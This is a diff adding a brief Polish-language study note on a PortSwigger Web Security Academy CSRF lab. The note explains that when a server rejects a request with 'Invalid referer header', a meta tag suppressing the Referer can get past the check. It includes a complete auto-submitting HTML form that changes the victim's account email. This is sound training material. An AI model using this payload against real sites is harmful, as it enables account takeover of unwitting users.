@@ -1,0 +1,13 @@
+Przy prubie zlosliwego requestu jezeli dostaniemy zwrotke z servera:
+""Invalid referer header""
+To mozemy dolozyc znacznik html ("<meta name="referrer" content="never">")
+(https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
+
+[Script]
+<meta name="referrer" content="never">
+<form method="POST" action="https://0a1c00b6030312f2c0b3135c008000ca.web-security-academy.net/my-account/change-email">
+<input type="email" name="email" value="bambo@rambo.lambo">
+</form>
+<script>
+document.forms[0].submit();
+</script>
